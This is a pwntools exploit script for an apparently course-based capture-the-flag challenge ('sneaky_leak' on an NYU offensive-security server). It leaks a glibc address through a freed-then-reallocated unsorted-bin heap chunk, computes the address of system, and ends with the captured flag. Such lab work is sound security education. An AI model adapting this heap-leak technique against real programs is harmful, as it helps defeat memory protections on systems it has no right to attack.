from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./sneaky_leak"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1210
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+211)
#     b *(main+223)
#     b *(main+235)
#     continue
# ''')

def free(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    log.info(f"Freeing the array at index: {index}")

def read(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"2")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    log.info(f"Reading the array at index: {index}")
    print(p.recvuntil(b": ").decode())    
    return u64(p.recvline().strip().ljust(8, b"\x00"))

def allocate(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    log.info(f"Allocating the array at index: {index}")

def guess(system_addr):
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    print(p.recvuntil(b"> ").decode())
    p.send(str(system_addr).encode())
    log.info(f"Guessing the system address: {system_addr}")

# Stage 1: Free the arr[65] of size 0x410 (heap chunk of size 0x420) to the unsorted bin
index = int(0x420 / 0x10 - 1)
free(index)

# Stage 2: Allocate the arr[65] to pass the check
allocate(index)

# Stage 3: Read the arr[65] to leak a glibc address
leaked_glibc_addr = read(index)
log.info(f"Receiving leaked glibc address: {hex(leaked_glibc_addr)}")

# Stage 4: Calculate the system address and guess it
glibc_e = ELF("libc.so.6")
glibc_base_addr = (leaked_glibc_addr & ~0xfff) - 0x1ec000
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system
guess(glibc_system_addr)

p.interactive()

# flag{S1LLY_malloc_U_shuld_m3ms3t!_5b1bbc134150140f}
